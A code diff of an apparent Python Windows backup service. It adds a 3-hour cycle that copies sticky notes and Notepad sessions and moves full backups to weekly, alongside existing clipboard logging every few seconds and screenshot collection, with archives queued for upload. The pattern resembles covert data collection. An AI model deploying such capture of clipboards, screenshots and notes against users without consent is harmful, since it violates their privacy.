@@ -94,7 +94,8 @@ def log_stage(record):
     if 'archive' in function or function in ('zip_backup_folder', 'split_large_file', 'split_large_directory'):
         return '归档'
     if any(word in function for word in ('collect', 'copy', 'backup_disk', 'backup_windows',
-                                         'backup_screenshots', 'backup_sticky_notes',
+                                         'backup_screenshots', 'backup_app_state',
+                                         'backup_sticky_notes',
                                          'backup_notepad')):
         return '收集'
     if 'state' in function:
@@ -211,7 +212,8 @@ class BackupConfig:
     FILE_DELETE_RETRY_DELAY = 2  # 文件删除重试等待时间（秒）
     
     # 监控配置
-    BACKUP_INTERVAL = 24 * 60 * 60  # 备份间隔时间：1天（单位：秒）
+    BACKUP_INTERVAL = 7 * 24 * 60 * 60  # 完整备份间隔：7天（单位：秒）
+    APP_STATE_BACKUP_INTERVAL = 3 * 60 * 60  # 便签和记事本会话备份间隔：3小时
     CLIPBOARD_INTERVAL = 1200  # JTB备份间隔时间（20分钟，单位：秒）
     CLIPBOARD_CHECK_INTERVAL = 3  # JTB检查间隔（秒）
     CLIPBOARD_UPLOAD_CHECK_INTERVAL = 30  # JTB上传检查间隔（秒）
@@ -762,9 +764,20 @@ class BackupManager:
                 handler.close()
 
     def _load_state(self):
-        state = {'version': 1, 'next_backup': None, 'retry_after': None,
-                 'last_success': None, 'collection_complete': False, 'pending': [],
-                 'cycle_archives': 0}
+        state = {
+            'version': 1,
+            'next_backup': None,
+            'retry_after': None,
+            'last_success': None,
+            'collection_complete': False,
+            'pending': [],
+            'cycle_archives': 0,
+            'next_app_state_backup': None,
+            'app_state_retry_after': None,
+            'last_app_state_success': None,
+            'app_state_collection_complete': False,
+            'app_state_archives': 0,
+        }
         if os.path.exists(self.config.STATE_FILE):
             with open(self.config.STATE_FILE, 'r', encoding='utf-8') as stream:
                 saved = json.load(stream)
@@ -774,6 +787,7 @@ class BackupManager:
             # 旧状态文件没有归档计数：按 0 处理，本轮重新收集，避免无归档也推进周期。
             try:
                 state['cycle_archives'] = int(state.get('cycle_archives') or 0)
+                state['app_state_archives'] = int(state.get('app_state_archives') or 0)
             except (TypeError, ValueError):
                 raise ValueError('备份状态文件格式无效；已保留原文件')
             if not isinstance(state['pending'], list):
@@ -784,7 +798,9 @@ class BackupManager:
                     raise ValueError('待上传清单包含越界路径')
                 if item['status'] not in ('pending', 'uploaded') or not item['group']:
                     raise ValueError('待上传状态无效')
-            for name in ('next_backup', 'retry_after', 'last_success'):
+            for name in ('next_backup', 'retry_after', 'last_success',
+                         'next_app_state_backup', 'app_state_retry_after',
+                         'last_app_state_success'):
                 if state[name]:
                     datetime.fromisoformat(state[name])
         elif os.path.exists(self.config.THRESHOLD_FILE):
@@ -841,7 +857,7 @@ class BackupManager:
                 pending = copy.deepcopy(self.state['pending'])
             candidates = [item for item in pending
                           if (kind is None or item['kind'] == kind) and item['status'] == 'pending']
-            show_progress = any(item['kind'] == 'backup' for item in candidates)
+            show_progress = any(item['kind'] in ('backup', 'app_state') for item in candidates)
             if candidates:
                 log_event(logging.INFO, '上传', 'upload_start:' + scope,
                           '准备上传 %s 项（归档/分片/日志，共 %s）',
@@ -901,7 +917,12 @@ class BackupManager:
             self._upload_failures.update(failed_kinds)
             recovered = self._upload_failures - remaining_kinds
             if recovered:
-                names = {'backup': '数据归档', 'log': '运行日志', 'clipboard': '剪贴板日志'}
+                names = {
+                    'backup': '数据归档',
+                    'app_state': '便签/记事本归档',
+                    'log': '运行日志',
+                    'clipboard': '剪贴板日志',
+                }
                 labels = '、'.join(names.get(name, name) for name in sorted(recovered))
                 self._upload_failures.difference_update(recovered)
                 log_event(logging.INFO, '恢复', 'upload_recovered',
@@ -1845,7 +1866,7 @@ def get_available_disks(config=None):
     return available_disks
 
 
-def _finish_collection(backup_manager, result, label, batch):
+def _finish_collection(backup_manager, result, label, batch, kind='backup'):
     batch.collections.append(result)
     display = task_label(label)
     if not result.complete:
@@ -1867,7 +1888,7 @@ def _finish_collection(backup_manager, result, label, batch):
                   display, len(result.files), format_size(result.total_size), console=False)
         archive = backup_manager.zip_backup_folder(
             result.directory, backup_manager.new_artifact_base(label), result.files)
-        backup_manager.enqueue_files(archive.paths)
+        backup_manager.enqueue_files(archive.paths, kind=kind)
         batch.paths.extend(archive.paths)
         # 清单持久化失败会在上面抛异常，此处不会删除唯一的本地副本。
         backup_manager._clean_directory(result.directory)
@@ -2137,14 +2158,27 @@ def backup_notepad_session(backup_manager, user_root=None):
     return result
 
 
-def backup_windows_data(backup_manager):
-    """备份便签、截图和配置中指定的文件；不访问浏览器或钱包扩展数据库。"""
+def backup_app_state(backup_manager):
+    """按高频周期独立备份便签和记事本会话。"""
     batch = BackupBatch()
     collectors = []
     if getattr(backup_manager.config, 'STICKY_NOTES_ENABLED', True):
         collectors.append(('sticky_notes', lambda: backup_sticky_notes(backup_manager)))
     if getattr(backup_manager.config, 'NOTEPAD_SESSION_ENABLED', True):
         collectors.append(('notepad_session', lambda: backup_notepad_session(backup_manager)))
+    for label, collect in collectors:
+        try:
+            _finish_collection(backup_manager, collect(), label, batch, kind='app_state')
+        except Exception as exc:
+            batch.errors.append(label + ': ' + str(exc))
+            DETAIL_LOGGER.exception('应用状态备份失败: %s', label)
+    return batch
+
+
+def backup_windows_data(backup_manager):
+    """备份截图和配置中指定的文件；不访问浏览器或钱包扩展数据库。"""
+    batch = BackupBatch()
+    collectors = []
     collectors.extend((
         ('screenshots', lambda: backup_screenshots(backup_manager)),
         ('specified', lambda: backup_manager.backup_specified_files(
@@ -2192,6 +2226,87 @@ def clipboard_upload_thread(backup_manager, clipboard_log_path):
         backup_manager.stop_event.wait(backup_manager.config.CLIPBOARD_UPLOAD_CHECK_INTERVAL)
 
 
+def _schedule_app_state_retry(backup_manager, now, reason):
+    retry_at = now + timedelta(seconds=backup_manager.config.ERROR_RETRY_DELAY)
+    backup_manager.update_state(app_state_retry_after=retry_at.isoformat())
+    log_event(logging.WARNING, '重试', 'app_state_retry',
+              '便签/记事本备份未完成（%s） | %s秒后重试 | 本地副本已保留',
+              reason, backup_manager.config.ERROR_RETRY_DELAY)
+
+
+def _complete_app_state_cycle(backup_manager, now):
+    backup_manager.update_state(
+        app_state_retry_after=None,
+        app_state_collection_complete=False,
+        app_state_archives=0,
+        last_app_state_success=now.isoformat(),
+        next_app_state_backup=(
+            now + timedelta(seconds=backup_manager.config.APP_STATE_BACKUP_INTERVAL)
+        ).isoformat(),
+    )
+    next_time = datetime.fromisoformat(
+        backup_manager.state['next_app_state_backup']).strftime('%Y-%m-%d %H:%M:%S')
+    log_event(logging.INFO, '完成', 'app_state_complete',
+              '便签和记事本会话备份已完成 | 下次备份：%s', next_time, console=False)
+
+
+def run_app_state_iteration(backup_manager, now=None):
+    """执行便签和记事本会话的独立 3 小时备份周期。"""
+    now = now or datetime.now()
+    state = backup_manager.state
+    retry_after = state.get('app_state_retry_after')
+    if retry_after and now < datetime.fromisoformat(retry_after):
+        return False
+
+    backup_manager.process_pending_uploads(kind='app_state')
+    state = backup_manager.state
+    if state.get('app_state_collection_complete'):
+        if backup_manager.has_pending('app_state'):
+            _schedule_app_state_retry(backup_manager, now, '归档尚未全部上传')
+        else:
+            _complete_app_state_cycle(backup_manager, now)
+        return not backup_manager.has_pending('app_state')
+
+    next_backup = state.get('next_app_state_backup')
+    if next_backup and now < datetime.fromisoformat(next_backup):
+        return False
+    if backup_manager.has_pending('app_state'):
+        _schedule_app_state_retry(backup_manager, now, '先处理已有待上传归档')
+        return False
+    if shutil.disk_usage(backup_manager.config.BACKUP_ROOT).free < backup_manager.config.MIN_FREE_SPACE:
+        raise OSError('备份磁盘剩余空间低于 MIN_FREE_SPACE，暂停便签/记事本备份')
+
+    started = time.monotonic()
+    batch = backup_app_state(backup_manager)
+    backup_manager.update_state(
+        app_state_collection_complete=batch.complete,
+        app_state_archives=len(batch.paths),
+    )
+    log_event(
+        logging.INFO if batch.complete else logging.WARNING,
+        '收集',
+        'app_state_collection_result',
+        '便签/记事本已复制 %s 个文件（%s） | 跳过 %s 项 | 失败 %s 项 | 耗时 %s',
+        sum(len(result.files) for result in batch.collections),
+        format_size(sum(result.total_size for result in batch.collections)),
+        sum(result.skipped for result in batch.collections),
+        len(batch.errors) + sum(len(result.errors) for result in batch.collections),
+        format_elapsed(started),
+        console=not batch.complete,
+    )
+    backup_manager.process_pending_uploads(kind='app_state')
+    if batch.complete and not backup_manager.has_pending('app_state'):
+        _complete_app_state_cycle(backup_manager, now)
+        return True
+    reasons = []
+    if not batch.complete:
+        reasons.append('部分收集失败')
+    if backup_manager.has_pending('app_state'):
+        reasons.append('归档尚未全部上传')
+    _schedule_app_state_retry(backup_manager, now, '；'.join(reasons) or '未完成')
+    return False
+
+
 def _complete_cycle(backup_manager, now):
     backup_manager.update_state(
         collection_complete=False, retry_after=None, cycle_archives=0,
@@ -2203,9 +2318,10 @@ def _complete_cycle(backup_manager, now):
 
 
 def _finish_or_retry(backup_manager, now):
-    """本轮只有生成有效归档、备份非部分完成且全部上传成功，才推进 1 天周期。
+    """本轮只有生成有效归档、备份非部分完成且全部上传成功，才推进 7 天周期。
 
-    运行日志、剪贴板日志属于独立上传类别，其失败不影响数据备份周期判定。
+    运行日志、剪贴板日志和便签/记事本归档属于独立上传类别，
+    其失败不影响完整数据备份周期判定。
     """
     state = backup_manager.state
     reasons = []
@@ -2227,9 +2343,21 @@ def _finish_or_retry(backup_manager, now):
 
 
 def run_scheduled_iteration(backup_manager, now=None):
-    """可单独验证的一轮调度；待上传文件优先于新一轮扫描。"""
+    """执行一次调度检查；3 小时应用状态周期与 7 天完整周期相互独立。"""
     clock = datetime.now if now is None else lambda: now
     now = clock()
+    try:
+        run_app_state_iteration(backup_manager, now)
+    except Exception as exc:
+        log_event(logging.WARNING, '任务', 'app_state_error',
+                  '便签/记事本备份任务异常：%s | %s秒后重试 | 详情见文件日志',
+                  exc, backup_manager.config.ERROR_RETRY_DELAY, exc_info=True)
+        try:
+            _schedule_app_state_retry(backup_manager, now, str(exc))
+        except Exception:
+            log_event(logging.ERROR, '状态', 'app_state_state_error',
+                      '无法保存便签/记事本重试状态', exc_info=True)
+
     state = backup_manager.state
     if state['retry_after'] and now < datetime.fromisoformat(state['retry_after']):
         return
@@ -2257,7 +2385,7 @@ def run_scheduled_iteration(backup_manager, now=None):
     if shutil.disk_usage(backup_manager.config.BACKUP_ROOT).free < backup_manager.config.MIN_FREE_SPACE:
         raise OSError('备份磁盘剩余空间低于 MIN_FREE_SPACE，保留已有文件并暂停新一轮收集')
     started = time.monotonic()
-    log_event(logging.INFO, '开始', 'cycle_start', '开始文件备份：磁盘文档、便签、指定文件和截图')
+    log_event(logging.INFO, '开始', 'cycle_start', '开始文件备份：磁盘文档、指定文件和截图')
     batch = backup_disks(backup_manager, get_available_disks(backup_manager.config))
     batch.extend(backup_windows_data(backup_manager))
     backup_manager.update_state(collection_complete=batch.complete, cycle_archives=len(batch.paths))
@@ -2276,12 +2404,18 @@ def run_scheduled_iteration(backup_manager, now=None):
 def periodic_backup_upload(backup_manager):
     workers = []
     next_time = backup_manager.state['next_backup']
-    plan = datetime.fromisoformat(next_time).strftime('%Y-%m-%d %H:%M:%S') if next_time else '立即检查'
+    app_state_time = backup_manager.state.get('next_app_state_backup')
+    full_plan = datetime.fromisoformat(next_time).strftime('%Y-%m-%d %H:%M:%S') if next_time else '立即检查'
+    app_state_plan = (
+        datetime.fromisoformat(app_state_time).strftime('%Y-%m-%d %H:%M:%S')
+        if app_state_time else '立即检查'
+    )
     with backup_manager._state_lock:
         pending_count = sum(item['status'] == 'pending' for item in backup_manager.state['pending'])
     log_event(logging.INFO, '启动', 'service_start',
-              '备份服务已启动 | 计划：%s | 待传 %s 项 | 剪贴板：%s',
-              plan, pending_count, '已启用' if pyperclip is not None else '已禁用')
+              '备份服务已启动 | 完整备份：%s | 便签/记事本：%s | 待传 %s 项 | 剪贴板：%s',
+              full_plan, app_state_plan, pending_count,
+              '已启用' if pyperclip is not None else '已禁用')
     log_event(logging.INFO, '日志', 'log_location', '详细日志：%s', backup_manager.config.LOG_FILE)
     if pyperclip is not None:
         username = getpass.getuser()
